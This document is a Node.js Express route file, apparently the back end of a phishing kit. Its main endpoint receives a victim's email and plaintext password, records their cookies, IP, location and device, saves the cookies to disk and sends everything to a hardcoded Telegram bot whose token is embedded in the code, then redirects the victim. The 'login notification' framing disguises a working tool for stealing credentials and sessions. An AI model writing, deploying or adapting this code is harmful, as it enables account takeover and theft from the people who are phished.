// routes/login-notify.js
const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";

// Debug logging
console.log('Telegram Config:', {
  hasBotToken: !!BOT_TOKEN,
  hasChatId: !!CHAT_ID,
  botTokenLength: BOT_TOKEN?.length
});

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../cookies');

// Telegram message sending function with plain text only
async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Attempting to send Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
        // NO parse_mode - plain text only
      }),
      timeout: 10000
    });

    const result = await response.json();
    
    console.log('Telegram API Response:', {
      status: response.status,
      ok: response.ok,
      result: result
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message,
      stack: error.stack 
    };
  }
}

async function ensureCookiesDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
  }
}

async function createCookiesFile(email, ip, cookiesBefore, cookiesAfter = null, redirectUrl = null) {
  await ensureCookiesDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.txt`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  let fileContent = `Cookies Capture Report
====================
Email: ${email}
IP: ${ip}
Timestamp: ${new Date().toISOString()}
Redirect URL: ${redirectUrl || 'No redirect'}
File: ${filename}

INITIAL COOKIES (Before any action):
${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}

Total Initial Cookies: ${Object.keys(cookiesBefore).length}
`;

  if (cookiesAfter && Object.keys(cookiesAfter).length > 0) {
    fileContent += `

COOKIES AFTER REDIRECT/RESPONSE:
${Object.entries(cookiesAfter).map(([k, v]) => `${k}: ${v}`).join('\n')}

Total Cookies After: ${Object.keys(cookiesAfter).length}

NEW COOKIES DETECTED:
${Object.entries(cookiesAfter)
  .filter(([k, v]) => !cookiesBefore[k] || cookiesBefore[k] !== v)
  .map(([k, v]) => `${k}: ${v} (${cookiesBefore[k] ? 'modified' : 'new'})`)
  .join('\n')}
`;
  }

  await fs.writeFile(filepath, fileContent);
  return { filename, filepath };
}

// Test routes
router.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    service: 'login-notify',
    time: new Date().toISOString(),
    telegramConfigured: !!TELEGRAM_API
  });
});

router.get('/test', (req, res) => {
  res.json({ 
    message: 'Login notify endpoint is working!',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development'
  });
});

// Echo route to test POST requests
router.post('/echo', (req, res) => {
  console.log('Echo received:', req.body);
  res.json({ 
    received: req.body,
    headers: req.headers,
    success: true 
  });
});

// Main login notification endpoint
router.post('/', async (req, res) => {
  try {
    console.log('=== LOGIN-NOTIFY ENDPOINT HIT ===');
    console.log('Headers:', req.headers);
    console.log('Body:', req.body);
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    console.log('IP:', req.ip);
    console.log('================================');

    const { email, password, redirect_url } = req.body || {};
    
    console.log('Received data:', { 
      email, 
      password: password ? '***' : 'missing', 
      redirect_url 
    });

    if (!email || !password) {
      console.log('Missing email or password');
      return res.status(400).json({ 
        success: false, 
        message: "Missing email or password",
        received: { hasEmail: !!email, hasPassword: !!password }
      });
    }

    // Capture cookies BEFORE any action
    const cookiesBefore = { ...req.cookies };
    
    // IP + geo
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // UA parsing
    const parser = new UAParser(req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Create initial cookies file
    let fileInfo = null;
    try {
      fileInfo = await createCookiesFile(email, ip, cookiesBefore, null, redirect_url);
      console.log(`Initial cookies file created: ${fileInfo.filename}`);
    } catch (fileError) {
      console.error('Error creating cookies file:', fileError);
    }

    // Build plain text message - NO MARKDOWN
    const cookieReport = Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)';

    // Build Telegram message - PLAIN TEXT ONLY
    const message = `LOGIN NOTIFICATION

Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${locationStr}
Timestamp: ${new Date().toISOString()}
Device: ${deviceType}
Redirect URL: ${redirect_url || 'None'}
Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}

Initial Cookies (${Object.keys(cookiesBefore).length}):
${cookieReport}
`;

    // Send to Telegram with plain text only
    console.log('Sending Telegram notification...');
    const telegramResult = await sendTelegramMessage(message);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // OPTION 1: Set some cookies and redirect
    if (redirect_url) {
      // Set some tracking cookies
      res.cookie('login_tracker', `track_${Date.now()}`, { 
        maxAge: 900000,
        httpOnly: true 
      });
      res.cookie('user_session', `session_${email}_${Date.now()}`, {
        maxAge: 3600000,
        httpOnly: true
      });
      
      // Capture cookies that WILL BE SET
      const cookiesAfter = {
        ...cookiesBefore,
        login_tracker: `track_${Date.now()}`,
        user_session: `session_${email}_${Date.now()}`
      };
      
      // Update cookies file with post-redirect info
      try {
        await createCookiesFile(email, ip, cookiesBefore, cookiesAfter, redirect_url);
      } catch (error) {
        console.error('Error updating cookies file:', error);
      }
      
      return res.redirect(redirect_url);
    }

    // OPTION 2: Just respond with JSON (no redirect)
    return res.status(200).json({
      success: true,
      message: "Login processed",
      telegramSent: telegramResult.success,
      redirect: redirect_url || false,
      loginDetails: {
        device: deviceType,
        ip,
        location: locationStr,
        cookiesCount: Object.keys(cookiesBefore).length,
        cookiesFile: fileInfo?.filename
      }
    });

  } catch (error) {
    console.error("Full error in /login-notify:", error);
    return res.status(500).json({ 
      success: false, 
      message: "Internal server error",
      error: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
});

module.exports = router;